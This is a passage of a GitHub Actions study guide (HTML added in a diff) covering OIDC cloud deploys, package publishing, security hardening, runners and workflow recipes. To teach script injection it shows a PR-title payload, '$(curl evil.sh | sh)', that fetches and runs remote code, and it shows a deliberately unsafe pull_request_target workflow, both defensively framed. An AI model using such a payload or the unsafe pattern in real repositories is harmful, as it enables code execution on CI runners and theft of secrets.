+<li><strong>Masking has limits.</strong> Actions masks known secret values in logs, but a secret that's been transformed — base64-encoded, split, embedded in JSON — can slip past the masker. Never <code>echo</code> a secret or pass it somewhere it gets printed.</li>
+<li><strong>Fork pull requests get no secrets.</strong> A <code>pull_request</code> from a fork runs with no access to your secrets and a read-only token, <em>by design</em> — so a stranger's PR can't exfiltrate them. This shapes how you structure PR CI (<a href="#part-7--security-hardening">Part 7</a>).</li>
+</ul>
+<p>For anything beyond static secrets, prefer <strong>OIDC</strong> (next) or fetch from an external secret manager at runtime.</p>
+<h3 id="oidc-to-cloud-no-stored-credentials">OIDC to Cloud (No Stored Credentials)</h3>
+<p>The single biggest security upgrade for a deploy pipeline: stop storing long-lived cloud keys as secrets. With <a href="https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect">OpenID Connect</a>, the workflow requests a short-lived, signed <strong>OIDC token</strong> from GitHub that describes the run (repo, branch, environment); your cloud is configured to <em>trust GitHub's OIDC provider</em> and exchange that token for short-lived credentials. Nothing long-lived is stored anywhere.</p>
+<p>The trust is scoped by the token's claims — above all <code>sub</code> (subject), which encodes values like <code>repo:ORG/REPO:ref:refs/heads/main</code> or <code>repo:ORG/REPO:environment:production</code>. You write a condition that matches exactly the runs you trust. (For the JWT and token-signing background, see the <a href="CRYPTO_FUNDAMENTALS.md">Cryptography guide</a>.)</p>
+<p><strong>AWS, end to end.</strong> First, an IAM role whose trust policy accepts GitHub's OIDC tokens for your repo's <code>main</code> branch:</p>
+<pre><code class="language-json">{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Principal&quot;: { &quot;Federated&quot;: &quot;arn:aws:iam::&lt;ACCOUNT_ID&gt;:oidc-provider/token.actions.githubusercontent.com&quot; },
+    &quot;Action&quot;: &quot;sts:AssumeRoleWithWebIdentity&quot;,
+    &quot;Condition&quot;: {
+      &quot;StringEquals&quot;: {
+        &quot;token.actions.githubusercontent.com:aud&quot;: &quot;sts.amazonaws.com&quot;
+      },
+      &quot;StringLike&quot;: {
+        &quot;token.actions.githubusercontent.com:sub&quot;: &quot;repo:&lt;ORG&gt;/&lt;REPO&gt;:ref:refs/heads/main&quot;
+      }
+    }
+  }]
+}
+</code></pre>
+<p>Then the workflow assumes that role. Note <code>permissions: id-token: write</code> — that scope is what lets the run request the OIDC token at all:</p>
+<pre><code class="language-yaml"># .github/workflows/deploy-aws.yml
+name: Deploy to AWS
+on:
+  push:
+    branches: [main]
+permissions:
+  id-token: write      # REQUIRED to request the OIDC token
+  contents: read       # least privilege for everything else
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::&lt;ACCOUNT_ID&gt;:role/github-actions-deploy
+          aws-region: us-east-1
+      - run: aws sts get-caller-identity   # proves the assumed creds work; replace with the real deploy
+</code></pre>
+<p>The same pattern covers the other clouds — only the trust setup and the auth action change:</p>
+<ul>
+<li><strong>Azure</strong> — <code>azure/login</code> with a federated credential on an app registration (see the <a href="AZURE_FOR_AWS_SOLUTIONS_ARCHITECT.md">Azure guide</a>).</li>
+<li><strong>GCP</strong> — Workload Identity Federation, exchanging the token via <code>google-github-actions/auth</code>.</li>
+<li><strong>Cloudflare</strong> — scoped API tokens, or OIDC where supported (see the <a href="CLOUDFLARE_STUDY_GUIDE.md">Cloudflare guide</a>).</li>
+<li><strong>HashiCorp Vault</strong> — Vault's JWT auth method validates the same GitHub OIDC token and returns a short-lived Vault token.</li>
+</ul>
+<h3 id="deployment-patterns">Deployment Patterns</h3>
+<p>With credentials solved, the deploy step itself is usually mundane:</p>
+<ul>
+<li><strong>Container image</strong> → build and push to a registry (next section), then tell your platform to roll it out.</li>
+<li><strong>Static site</strong> → upload to object storage, a CDN, or Pages.</li>
+<li><strong>Kubernetes</strong> → <code>kubectl apply</code> or a GitOps nudge, authenticating to the cluster's cloud via OIDC. See the <a href="k8s/KUBERNETES_STUDY_GUIDE.md">Kubernetes guide</a>.</li>
+</ul>
+<p>Two cross-cutting concerns: gate production behind an <code>environment:</code> with a required reviewer, and use <code>concurrency:</code> so two deploys can't race (detailed in <a href="#part-8--operations-at-scale">Part 8</a>):</p>
+<pre><code class="language-yaml">concurrency:
+  group: deploy-production       # serialize everything in this group
+  cancel-in-progress: false      # let an in-flight deploy finish; queue the next rather than cancel
+</code></pre>
+<h3 id="release-publishing-automation">Release &amp; Publishing Automation</h3>
+<p>Releases are usually <strong>tag-driven</strong>: pushing a <code>v*</code> tag triggers the publish.</p>
+<p><strong>Container image to GHCR</strong> (GitHub's own registry), authenticating with the built-in token — no PAT required:</p>
+<pre><code class="language-yaml"># .github/workflows/publish-image.yml
+name: Publish image
+on:
+  push:
+    tags: ['v*']
+permissions:
+  contents: read
+  packages: write              # required to push to GHCR
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      - uses: docker/build-push-action@v6
+        with:
+          push: true
+          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}   # ref_name is the tag, e.g. v1.2.0
+</code></pre>
+<p><strong>A Python library to PyPI via trusted publishing</strong> — OIDC again, so there's no API token to store. Register the project as a "trusted publisher" on PyPI, then:</p>
+<pre><code class="language-yaml"># .github/workflows/publish-pypi.yml
+name: Publish to PyPI
+on:
+  push:
+    tags: ['v*']
+permissions:
+  contents: read
+  id-token: write              # trusted publishing exchanges an OIDC token, not a stored password
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    environment: pypi            # optional: gate the publish behind an environment
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - run: pip install build &amp;&amp; python -m build    # produces dist/*.whl and dist/*.tar.gz
+      - uses: pypa/gh-action-pypi-publish@release/v1  # reads the OIDC token; no username/password
+</code></pre>
+<p>npm and crates.io follow the same shape: build, then publish with a token in <code>NODE_AUTH_TOKEN</code> / <code>CARGO_REGISTRY_TOKEN</code> (npm now also supports OIDC trusted publishing). And when you create a GitHub <strong>Release</strong>, it can <a href="https://docs.github.com/en/actions/publishing-packages">auto-generate release notes</a> from merged PRs — a changelog for free.</p>
+<hr>
+<h2 id="part-7-security-hardening">Part 7 — Security Hardening</h2>
+<p>CI/CD is a high-value target: it holds credentials, has write access to your repository, and often the keys to production. This is the part to read twice. The mindset to hold throughout: <strong>treat every workflow as code an attacker will try to influence</strong> — through a malicious pull request, a compromised dependency, or a poisoned action.</p>
+<h3 id="the-threat-model">The Threat Model</h3>
+<p>Concretely, what goes wrong:</p>
+<ul>
+<li>A malicious PR runs code in your CI with access to secrets or a writable token — and exfiltrates secrets, pushes commits, or mints cloud credentials.</li>
+<li>A third-party action you <code>uses:</code> is compromised (or was always hostile) — same blast radius, because actions run with <strong>your job's</strong> privileges.</li>
+<li>Untrusted input (a PR title, branch name, issue body) is interpolated into a shell command — arbitrary code execution on the runner.</li>
+<li>A cache or artifact is poisoned in a low-trust context and consumed by a high-trust one.</li>
+</ul>
+<p>The rest of this part is the defenses, in priority order.</p>
+<h3 id="pull_request-vs-pull_request_target-the-classic-footgun"><code>pull_request</code> vs <code>pull_request_target</code> — the Classic Footgun</h3>
+<p>These two triggers look interchangeable and are anything but:</p>
+<ul>
+<li><strong><code>pull_request</code></strong> (from a fork) runs against the PR's merge commit with a <strong>read-only token and no secrets</strong>. Safe by default — a stranger's code cannot touch your secrets. This is what you want for building and testing fork PRs.</li>
+<li><strong><code>pull_request_target</code></strong> runs in the context of the <strong>base</strong> repository — <strong>with secrets and a read/write token</strong> — but checks out the base branch's code by default. It exists for trusted tasks like labeling or commenting on PRs.</li>
+</ul>
+<p>The footgun is using <code>pull_request_target</code> and then checking out and <strong>running the PR's code</strong>. Now untrusted code executes with your secrets and a writable token:</p>
+<pre><code class="language-yaml"># UNSAFE — do not do this
+on: pull_request_target            # runs with secrets + a write token
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # checks out UNTRUSTED PR code...
+      - run: npm ci &amp;&amp; npm run build                        # ...then runs it, with secrets in scope
+</code></pre>
+<pre><code class="language-yaml"># SAFE — build/test fork code under pull_request (no secrets);
+# reserve pull_request_target for trusted, code-free tasks only.
+on: pull_request                   # read-only token, no secrets — safe to run PR code
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4   # checks out the PR code, but in a powerless context
+      - run: npm ci &amp;&amp; npm test
+</code></pre>
+<p>If you genuinely need secrets for a fork PR (a deploy preview, say), gate it behind an environment with a required reviewer, or move the privileged work into a separate <code>workflow_run</code> that never executes the PR's code.</p>
+<h3 id="script-injection">Script Injection</h3>
+<p>Anything an outsider controls — PR title, branch name, issue body, commit message — is untrusted. Splicing it straight into a <code>run:</code> block is remote code execution:</p>
+<pre><code class="language-yaml"># UNSAFE — do not do this
+- run: echo &quot;Title: ${{ github.event.pull_request.title }}&quot;
+</code></pre>
+<p>The <code>${{ }}</code> is substituted <em>before</em> the shell runs, so a PR titled <code>$(curl evil.sh | sh)</code> (or wrapped in backticks) executes on your runner. The fix: pass the value in through an environment variable so the shell treats it as <strong>data, never code</strong>:</p>
+<pre><code class="language-yaml"># SAFE
+- env:
+    TITLE: ${{ github.event.pull_request.title }}   # bound to an env var, not spliced into the script
+  run: echo &quot;Title: $TITLE&quot;                          # the shell expands $TITLE as a plain string
+</code></pre>
+<p>The same rule applies to any context value derived from user input. When in doubt, route it through <code>env:</code>.</p>
+<h3 id="pin-third-party-actions-to-a-commit-sha">Pin Third-Party Actions to a Commit SHA</h3>
+<p><code>uses: some/action@v3</code> pins to a <strong>tag</strong>, and tags are <strong>mutable</strong>: whoever controls that action's repo can move <code>v3</code> onto new code — including malicious code — and every workflow using <code>@v3</code> runs it on the next execution. Pinning to a full 40-character commit SHA removes that power:</p>
+<pre><code class="language-yaml">- uses: actions/checkout@&lt;40-char-commit-sha&gt; # v4   # immutable — a SHA can't be silently repointed
+</code></pre>
+<p>The trailing comment keeps it readable. To stop pinned SHAs from going stale, let Dependabot bump them:</p>
+<pre><code class="language-yaml"># .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: github-actions
+    directory: /
+    schedule:
+      interval: weekly
+</code></pre>
+<p>(First-party <code>actions/*</code> are lower risk, but the same supply-chain logic applies — SHA-pin anything you don't control.)</p>
+<h3 id="least-privilege-permissions">Least Privilege: <code>permissions</code></h3>
+<p>The automatic <code>GITHUB_TOKEN</code> is powerful, so default it to read-only and grant scopes only where needed. Set the org/repo default to restricted in settings, and declare per-workflow and per-job in YAML (<a href="https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs">assigning permissions</a>):</p>
+<pre><code class="language-yaml">permissions:
+  contents: read           # workflow-wide default: read the repo, nothing else
+jobs:
+  publish:
+    permissions:
+      contents: read
+      packages: write       # only this job can push packages
+      id-token: write       # ...and only this job can request an OIDC token
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./publish.sh
+</code></pre>
+<p>Declaring any <code>permissions:</code> block forces every unlisted scope to <code>none</code> — exactly right: start from nothing and add the minimum. (The full scope list is in <a href="https://docs.github.com/en/actions/security-guides/automatic-token-authentication">automatic token authentication</a>.)</p>
+<h3 id="secrets-exposure-and-the-supply-chain">Secrets Exposure and the Supply Chain</h3>
+<p>Rounding out the defenses (<a href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions">security hardening</a>, <a href="https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions">using secrets</a>):</p>
+<ul>
+<li><strong>Don't defeat masking.</strong> Masking catches verbatim secret values; it cannot catch a base64'd or reassembled secret. Never print secrets, and avoid handing them to steps that log verbosely.</li>
+<li><strong>Forks never receive secrets</strong> (the <code>pull_request</code> rule). Don't engineer around it — it is load-bearing.</li>
+<li><strong>Restrict which actions can run.</strong> Org/repo settings can limit <code>uses:</code> to GitHub-authored and verified-creator actions, or an explicit allowlist — a strong supply-chain control.</li>
+<li><strong>Attest your builds.</strong> <code>actions/attest-build-provenance</code> produces signed provenance for your artifacts and images, so downstream consumers can verify what built them.</li>
+<li><strong>Audit third-party actions</strong> before adopting: read the source at the SHA you pin, prefer verified publishers, and remember that a <em>transitive</em> action (one your action depends on) inherits the same access.</li>
+</ul>
+<hr>
+<h2 id="part-8-operations-at-scale">Part 8 — Operations at Scale</h2>
+<p>Hosted runners and the defaults carry you a long way. This part is what changes once you're running thousands of jobs, need special hardware, or have to reach private infrastructure.</p>
+<h3 id="hosted-vs-self-hosted-runners">Hosted vs Self-Hosted Runners</h3>
+<p>GitHub-hosted runners are fresh, fully managed VMs billed per minute. Add or switch to <a href="https://docs.github.com/en/actions/hosting-your-own-runners">self-hosted runners</a> when you need:</p>
+<ul>
+<li>special hardware (GPUs, large memory, Apple silicon you control),</li>
+<li>access to a private network (an internal database, an on-prem registry),</li>
+<li>a custom OS or pre-baked image, or</li>
+<li>to control cost at very high volume.</li>
+</ul>
+<p>The trade-off: you now own the patching, isolation, and security of those machines.</p>
+<h3 id="self-hosted-runners">Self-Hosted Runners</h3>
+<p>A self-hosted runner is the runner agent registered to your repo or org. The registration flow (token comes from repo/org settings) is:</p>
+<pre><code class="language-bash"># on the machine that will run jobs
+./config.sh --url https://github.com/&lt;ORG&gt;/&lt;REPO&gt; --token &lt;REG_TOKEN&gt; --labels gpu,linux
+./run.sh    # start the agent; it polls GitHub for jobs whose runs-on matches its labels
+</code></pre>
+<p>Target it from a workflow by label:</p>
+<pre><code class="language-yaml">jobs:
+  train:
+    runs-on: [self-hosted, gpu]   # matches a runner advertising BOTH labels
+</code></pre>
+<p><strong>The critical caveat:</strong> never attach a self-hosted runner to a <strong>public</strong> repository that accepts fork PRs. A fork's pull request could run arbitrary code on your runner — your hardware, your network, your blast radius. For public repos, stay on hosted runners. And prefer <strong>ephemeral</strong> runners (one job, then deregister) so no state leaks between jobs:</p>
+<pre><code class="language-bash">./config.sh --url https://github.com/&lt;ORG&gt; --token &lt;REG_TOKEN&gt; --ephemeral
+</code></pre>
+<h3 id="autoscaling-with-actions-runner-controller-arc">Autoscaling with Actions Runner Controller (ARC)</h3>
+<p>Idle standing runners are wasteful; scaling them by hand is toil. <a href="https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-actions-runner-controller">Actions Runner Controller</a> (ARC) runs runners as pods on Kubernetes and scales them with demand. You install the controller, then a <em>runner scale set</em> via Helm:</p>
+<pre><code class="language-yaml"># values.yaml for the gha-runner-scale-set Helm chart (helm install ... -f values.yaml)
+githubConfigUrl: https://github.com/&lt;ORG&gt;
+githubConfigSecret: arc-github-secret   # holds a GitHub App or PAT used to register runners
+minRunners: 0                           # scale to zero when there's no work
+maxRunners: 50                          # cap on concurrent runner pods
+runnerScaleSetName: linux-arc           # this name becomes the runs-on label
+</code></pre>
+<pre><code class="language-yaml">jobs:
+  build:
+    runs-on: linux-arc   # the scale-set name is what you target
+</code></pre>
+<p>Pods are created on demand and torn down afterward, so you pay only for what runs; this pairs naturally with cluster autoscaling — see the <a href="k8s/KUBERNETES_STUDY_GUIDE.md">Kubernetes guide</a>. If you'd rather not operate ARC, GitHub also sells <strong>larger hosted runners</strong> (more CPU/RAM, optional static IPs) and <strong>runner groups</strong> for access control — the simpler, paid path.</p>
+<h3 id="concurrency-control">Concurrency Control</h3>
+<p>By default every trigger starts a run, so pushes pile up and deploys can race. <code>concurrency:</code> groups runs so only one per group is active at a time (<a href="https://docs.github.com/en/actions/using-jobs/using-concurrency">concurrency docs</a>):</p>
+<pre><code class="language-yaml"># CI: when newer commits arrive on the same branch/PR, cancel the superseded run
+concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true     # older runs are pointless once newer commits exist — save the minutes
+</code></pre>
+<pre><code class="language-yaml"># Deploy: never cancel a deploy mid-flight; queue the next one instead
+concurrency:
+  group: deploy-production
+  cancel-in-progress: false    # let the running deploy finish, then run the latest queued run
+</code></pre>
+<p>The pattern: <code>cancel-in-progress: true</code> for CI (only the latest commit matters), <code>false</code> for deploys (don't interrupt a half-applied rollout).</p>
+<h3 id="cost-and-optimization">Cost and Optimization</h3>
+<p>Hosted minutes are free for public repos and included up to a quota for private ones, then billed. Two things to internalize:</p>
+<ul>
+<li><strong>OS multipliers.</strong> Linux is billed at 1×, but Windows and especially macOS minutes cost a multiple — keep expensive-OS jobs lean.</li>
+<li><strong>The fastest way to cut the bill is to cut runtime:</strong> cache aggressively (Part 3), right-size matrices (don't run 9 combos when 3 cover the risk), use <code>paths</code> filters to skip irrelevant runs, and use <code>concurrency</code> to cancel superseded CI. (<a href="https://docs.github.com/en/billing/managing-billing-for-github-actions">Billing reference</a>.)</li>
+</ul>
+<h3 id="debugging-workflows">Debugging Workflows</h3>
+<p>When a run misbehaves:</p>
+<ul>
+<li><strong>Re-run</strong> the whole workflow, or just the failed jobs, from the UI — handy for flaky external dependencies.</li>
+<li><strong>Step debug logging:</strong> set the repository secret/variable <code>ACTIONS_STEP_DEBUG</code> to <code>true</code> for verbose runner logs (<a href="https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging">enabling debug logging</a>).</li>
+<li><strong>Interactive SSH:</strong> drop <a href="https://github.com/mxschmitt/action-tmate"><code>mxschmitt/action-tmate</code></a> into a workflow to open an SSH session into the live runner and poke around — invaluable for "works locally, fails in CI."</li>
+<li><strong>Run locally with <a href="https://github.com/nektos/act"><code>act</code></a>:</strong> it executes workflows on your machine in Docker containers. Fidelity isn't perfect (it approximates the hosted images), but the feedback loop beats push-and-wait. Requires Docker — see the <a href="DOCKER_STUDY_GUIDE.md">Docker guide</a>.</li>
+</ul>
+<hr>
+<h2 id="part-9-comparison-to-alternatives">Part 9 — Comparison to Alternatives</h2>
+<p>GitHub Actions isn't the only CI/CD system and isn't always the right one. Here's an honest read on where it sits.</p>
+<h3 id="the-landscape">The Landscape</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Model</th>
+<th>Where it shines</th>
+<th>Where Actions wins</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GitLab CI/CD</strong></td>
+<td>YAML pipelines, integrated with GitLab</td>
+<td>One platform for repo + CI + registry + security; powerful <code>rules:</code>; built-in environments</td>
+<td>It's already in GitHub; far larger marketplace of reusable actions</td>
+</tr>
+<tr>
+<td><strong>CircleCI</strong></td>
+<td>YAML, SaaS; "orbs" for reuse</td>
+<td>Fast, mature caching/parallelism; strong macOS support</td>
+<td>No separate SaaS account; tighter GitHub integration; free for public repos</td>
+</tr>
+<tr>
+<td><strong>Jenkins</strong></td>
+<td>Self-hosted, Groovy pipelines, plugins</td>
+<td>Ultimate flexibility; runs anywhere; vast plugin ecosystem; full on-prem control</td>
+<td>No server to run or patch; YAML over Groovy; managed runners</td>
+</tr>
+<tr>
+<td><strong>Buildkite</strong></td>
+<td>Hybrid: SaaS control plane, your own agents</td>
+<td>Scales massively on your own infra; excellent for big monorepos</td>
+<td>Fully hosted option; no agents to manage for the common case</td>
+</tr>
+<tr>
+<td><strong>Dagger</strong></td>
+<td>Pipelines as code (Go/Python/etc.), run in containers</td>
+<td>Portable — the <em>same</em> pipeline runs locally and on any CI; strong caching</td>
+<td>Native GitHub integration; no extra engine to learn</td>
+</tr>
+</tbody>
+</table>
+<p>The throughlines: Actions wins on <strong>integration</strong> (it's already in your repo and your PRs) and <strong>ecosystem</strong> (the Marketplace). It loses to Jenkins on raw flexibility and on-prem control, to GitLab on being a single integrated DevOps platform, to Buildkite on very-large-scale self-hosted throughput, and to Dagger on running the identical pipeline off-CI.</p>
+<h3 id="migrating-to-actions">Migrating to Actions</h3>
+<p>GitHub publishes <a href="https://docs.github.com/en/actions/migrating-to-github-actions">migration guides</a>; the two most common sources:</p>
+<p><strong>From GitLab CI</strong> (<code>.gitlab-ci.yml</code> → workflows) — the concepts map cleanly:</p>
+<table>
+<thead>
+<tr>
+<th>GitLab CI</th>
+<th>GitHub Actions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>stages:</code> + <code>stage:</code></td>
+<td><code>jobs</code> + <code>needs:</code> (build the DAG explicitly)</td>
+</tr>
+<tr>
+<td><code>script:</code></td>
+<td><code>run:</code> steps</td>
+</tr>
+<tr>
+<td><code>rules:</code> / <code>only</code>/<code>except</code></td>
+<td><code>on:</code> filters + <code>if:</code> conditions</td>
+</tr>
+<tr>
+<td><code>image:</code></td>
+<td>a container job (<code>container:</code>) or <code>services:</code></td>
+</tr>
+<tr>
+<td><code>artifacts:</code> / <code>cache:</code></td>
+<td><code>actions/upload-artifact</code> / <code>actions/cache</code></td>
+</tr>
+<tr>
+<td><code>include:</code></td>
+<td>reusable workflows / composite actions</td>
+</tr>
+</tbody>
+</table>
+<p>The main mental shift: GitLab sequences by <em>stage</em>; Actions sequences by <em>explicit <code>needs</code> dependencies</em> — there's no implicit ordering.</p>
+<p><strong>From Jenkins</strong> (<code>Jenkinsfile</code> → workflows) — a bigger leap, since you trade imperative Groovy for declarative YAML:</p>
+<ul>
+<li><code>stage('X') { ... }</code> → a job (or a group of steps).</li>
+<li><code>agent { ... }</code> → <code>runs-on:</code>.</li>
+<li>Shared libraries → custom/composite actions and reusable workflows.</li>
+<li>Plugins → Marketplace actions (most common plugins have an equivalent; some don't).</li>
+<li>Credentials plugin → secrets + OIDC.</li>
+</ul>
+<p>Expect to <em>redesign</em> rather than transliterate — Jenkins pipelines often encode logic that belongs in scripts or actions.</p>
+<h3 id="when-not-to-reach-for-actions">When <em>Not</em> to Reach for Actions</h3>
+<p>The honest misfits:</p>
+<ul>
+<li><strong>Your source isn't on GitHub</strong> (GitLab, Bitbucket, self-hosted) — use that platform's native CI.</li>
+<li><strong>You have a large, working Jenkins estate</strong> with deep plugin dependencies — migration cost can outweigh the benefit.</li>
+<li><strong>You need pipelines that run identically outside any CI</strong> (locally, across multiple vendors) — a portable engine like Dagger fits better.</li>
+<li><strong>Heavy, long-running, exotic-hardware builds</strong> where you'd self-host everything anyway — Buildkite or Jenkins may model that more naturally.</li>
+</ul>
+<p>For most teams already on GitHub, none of these apply, and the integration advantage is decisive.</p>
+<hr>
+<h2 id="part-10-recipes-end-to-end-walkthrough">Part 10 — Recipes &amp; End-to-End Walkthrough</h2>
+<p>Everything so far, assembled into things you can copy. Each recipe is a complete, valid workflow file — adapt the names and commands to your project. The chapter closes by walking a single service from an empty repo to a production pipeline.</p>
+<h3 id="recipe-1-lint-test-build-across-versions-and-oses">Recipe 1: Lint, Test, Build — Across Versions and OSes</h3>
+<p>The default CI workflow: a matrix running lint, test, and build on every push to <code>main</code> and every PR.</p>
+<pre><code class="language-yaml"># .github/workflows/ci.yml
+name: CI
+on:
+  push:
+    branches: [main]
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false               # show every combo's result, not just the first failure
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+        node: [18, 20, 22]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node }}
+          cache: npm
+      - run: npm ci
+      - run: npm run lint
+      - run: npm test
+      - run: npm run build
+</code></pre>
+<h3 id="recipe-2-monorepo-ci-with-change-detection">Recipe 2: Monorepo CI with Change Detection</h3>
+<p>In a monorepo you only want to build what changed. <a href="https://github.com/dorny/paths-filter"><code>dorny/paths-filter</code></a> computes which paths a PR touched; downstream jobs gate on its outputs, so untouched packages are skipped.</p>
+<pre><code class="language-yaml"># .github/workflows/monorepo-ci.yml
+name: Monorepo CI
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  changes:
+    runs-on: ubuntu-latest
+    outputs:
+      api: ${{ steps.filter.outputs.api }}     # 'true' if any api path changed
+      web: ${{ steps.filter.outputs.web }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: dorny/paths-filter@v3
+        id: filter
+        with:
+          filters: |
+            api:
+              - 'services/api/**'
+            web:
+              - 'apps/web/**'
+  api:
+    needs: changes
+    if: needs.changes.outputs.api == 'true'    # only run when the api changed
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: echo &quot;build &amp; test api&quot;
+  web:
+    needs: changes
+    if: needs.changes.outputs.web == 'true'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: echo &quot;build &amp; test web&quot;
+</code></pre>
+<h3 id="recipe-3-build-and-push-a-container-to-ghcr-with-provenance">Recipe 3: Build and Push a Container to GHCR with Provenance</h3>
+<p>On a version tag, build the image, push it to GHCR, and attach signed <a href="https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds">build provenance</a> so consumers can verify its origin (Part 7).</p>
+<pre><code class="language-yaml"># .github/workflows/release-image.yml
+name: Release image
+on:
+  push:
+    tags: ['v*']
+permissions:
+  contents: read
+  packages: write       # push to GHCR
+  id-token: write       # sign the provenance attestation
+  attestations: write   # record the attestation
+jobs:
+  build-push:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      - id: push
+        uses: docker/build-push-action@v6
+        with:
+          push: true
+          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}
+      - uses: actions/attest-build-provenance@v1
+        with:
+          subject-name: ghcr.io/${{ github.repository }}
+          subject-digest: ${{ steps.push.outputs.digest }}   # digest output by build-push-action
+          push-to-registry: true
+</code></pre>
+<h3 id="recipe-4-oidc-deploy-to-aws-no-stored-credentials">Recipe 4: OIDC Deploy to AWS — No Stored Credentials</h3>
+<p>The Part 6 pattern, condensed and gated behind a <code>production</code> environment.</p>
+<pre><code class="language-yaml"># .github/workflows/deploy-oidc.yml
+name: Deploy (OIDC)
+on:
+  push:
+    branches: [main]
+permissions:
+  id-token: write       # request the OIDC token
+  contents: read
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production              # can require a reviewer before it runs
+    steps:
+      - uses: actions/checkout@v4
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
+          aws-region: us-east-1
+      - run: ./deploy.sh                 # runs with short-lived, assumed-role credentials
+</code></pre>
+<h3 id="recipe-5-publish-a-library-on-tag">Recipe 5: Publish a Library on Tag</h3>
+<p>Push a <code>v*</code> tag; publish to npm with provenance.</p>
+<pre><code class="language-yaml"># .github/workflows/publish.yml
+name: Publish package
+on:
+  push:
+    tags: ['v*']
+permissions:
+  contents: read
+  id-token: write              # required for npm --provenance
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          registry-url: https://registry.npmjs.org
+      - run: npm ci
+      - run: npm publish --provenance --access public   # attaches build provenance to the package
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+</code></pre>
+<h3 id="end-to-end-from-empty-repo-to-production-pipeline">End-to-End: From Empty Repo to Production Pipeline</h3>
+<p>Now assemble a real delivery pipeline for a containerized web service. The goal: every PR is validated, every merge to <code>main</code> builds an image and rolls to staging automatically, and production is a gated promotion.</p>
+<p><strong>The decisions, in order:</strong></p>
+<ol>
+<li><strong>Validate PRs cheaply and safely.</strong> Use Recipe 1's <code>ci.yml</code> on <code>pull_request</code> — lint and test under a read-only token with no secrets, so fork PRs are safe (Part 7). Make it the merge gate by requiring it as a status check in branch protection.</li>
+<li><strong>On merge to <code>main</code>, build once and deploy.</strong> A separate <code>deliver.yml</code> runs on <code>push</code> to <code>main</code>: re-run tests (the merge result can differ from the PR), build the image tagged by commit SHA, push to GHCR, then deploy.</li>
+<li><strong>Stage before prod.</strong> <code>deploy-staging</code> runs automatically. <code>deploy-production</code> <code>needs</code> it and binds to a <strong>protected <code>production</code> environment</strong> — configured in repo settings with a <em>required reviewer</em>, so the run pauses for a human click before touching prod.</li>
+<li><strong>Don't let deploys race.</strong> A <code>concurrency</code> group serializes deliveries with <code>cancel-in-progress: false</code>, so a half-finished rollout is never interrupted.</li>
+</ol>
+<p>The whole merge-to-prod path in one file:</p>
+<pre><code class="language-yaml"># .github/workflows/deliver.yml
+name: Deliver
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+  packages: write
+  id-token: write
+concurrency:
+  group: deliver-${{ github.ref }}
+  cancel-in-progress: false        # never interrupt an in-flight delivery
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          cache: npm
+      - run: npm ci
+      - run: npm test
+  image:
+    needs: test
+    runs-on: ubuntu-latest
+    outputs:
+      tag: ${{ steps.meta.outputs.tag }}    # publish the built tag for downstream jobs
+    steps:
+      - uses: actions/checkout@v4
+      - id: meta
+        run: echo &quot;tag=ghcr.io/${{ github.repository }}:${{ github.sha }}&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;
+      - uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      - uses: docker/build-push-action@v6
+        with:
+          push: true
